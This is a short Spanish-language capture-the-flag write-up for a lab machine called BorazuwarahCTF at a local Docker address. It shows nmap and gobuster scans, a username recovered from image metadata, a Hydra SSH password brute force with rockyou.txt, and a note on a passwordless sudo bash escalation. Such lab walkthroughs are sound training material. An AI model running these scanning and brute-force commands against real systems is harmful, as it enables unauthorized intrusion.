# BorazuwarahCTF

## 0. HERRAMIENTAS

- Hydra
- metasploit

## 1. ENUMERACION

Realizamos un escaneo de puertos

```jsx
sudo nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2
```

Vemos los puertos abiertos:

- 22
- 80

![image.png](BorazuwarahCTF%20d817f7129aff41a9b8f0b269d53dd510/image.png)

La url muestra la siguiente imagen

![image.png](BorazuwarahCTF%20d817f7129aff41a9b8f0b269d53dd510/image%201.png)

Guardamos la imagen y pasamos a realizar una búsqueda de directorios

```jsx
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u '[http://172.17.0.2](http://172.17.0.2/)' -x 'html,txt,php,py,jpeg'
```

![image.png](BorazuwarahCTF%20d817f7129aff41a9b8f0b269d53dd510/image%202.png)

Solo aparece la imagen que hemos encontrado antes

![image.png](BorazuwarahCTF%20d817f7129aff41a9b8f0b269d53dd510/image%203.png)

Analizando metadatos de la imagen vemos que hay oculto un usuario

![image.png](BorazuwarahCTF%20d817f7129aff41a9b8f0b269d53dd510/image%204.png)

## 2. COMPROMISO DEL ENTORNO

Utilizaremos Hydra para intentar de obtener la contraseña por fuerza bruta

```jsx
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
```

Encontramos la contraseña

![image.png](BorazuwarahCTF%20d817f7129aff41a9b8f0b269d53dd510/image%205.png)

Accedemos por ssh

![image.png](BorazuwarahCTF%20d817f7129aff41a9b8f0b269d53dd510/image%206.png)

## 3. ESCALACION DE PRIVILEGIOS

Vemos que se puede ejecutar desde cualquier usuario y sin contraseña el /bin/bash

![image.png](BorazuwarahCTF%20d817f7129aff41a9b8f0b269d53dd510/image%207.png)

![image.png](BorazuwarahCTF%20d817f7129aff41a9b8f0b269d53dd510/image%208.png)